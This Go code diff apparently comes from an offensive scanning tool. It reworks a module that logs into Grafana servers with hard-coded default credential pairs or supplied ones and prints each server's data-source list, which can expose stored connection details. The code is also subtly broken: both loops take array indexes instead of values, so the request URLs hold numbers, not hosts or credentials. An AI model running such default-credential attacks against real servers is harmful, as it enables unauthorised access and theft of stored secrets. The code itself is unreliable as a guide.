@@ -11,22 +11,38 @@ import (
 type Datasource struct{}
 
 func (m Datasource) RunModule(targets []string, flags map[string]string) {
-	if flags["user"] == "" && flags["password"] == "" {
-		grafanaDefaultCreds := [3]string{"admin:admin", "admin:prom-operator", "admin:openbmp"}
-		var port string
+	var port string
 
-		if flags["port"] == "" {
-			port = "3000"
+	if flags["port"] == "" {
+		port = "3000"
+	} else {
+		port = flags["port"]
+	}
+
+	client := http.Client{
+		Timeout: 1 * time.Second,
+	}
+
+	for target := range targets {
+		if flags["user"] == "" && flags["password"] == "" {
+			grafanaDefaultCreds := [3]string{"admin:admin", "admin:prom-operator", "admin:openbmp"}
+			for creds := range grafanaDefaultCreds {
+				url := fmt.Sprintf("http://%s@%s:%s/api/datasources", creds, target, port)
+
+				response, err := utils.HttpRequest(url, http.MethodGet, []byte(""), client)
+				if err != nil {
+					return
+				}
+				respBody, err := ioutil.ReadAll(response.Body)
+				defer response.Body.Close()
+				if err != nil {
+					fmt.Printf("client: could not read response body: %s\n", err)
+				}
+
+				fmt.Println(respBody)
+			}
 		} else {
-			port = flags["port"]
-		}
-
-		client := http.Client{
-			Timeout: 1 * time.Second,
-		}
-
-		for target := range targets {
-			url := fmt.Sprintf("http://%s@%s:%s/api/datasources", creds, target, port)
+			url := fmt.Sprintf("http://%s:%s@%s:%s/api/datasources", flags["user"], flags["password"], target, port)
 
 			response, err := utils.HttpRequest(url, http.MethodGet, []byte(""), client)
 			if err != nil {
@@ -37,6 +53,8 @@ func (m Datasource) RunModule(targets []string, flags map[string]string) {
 			if err != nil {
 				fmt.Printf("client: could not read response body: %s\n", err)
 			}
+
+			fmt.Println(respBody)
 		}
 	}
 
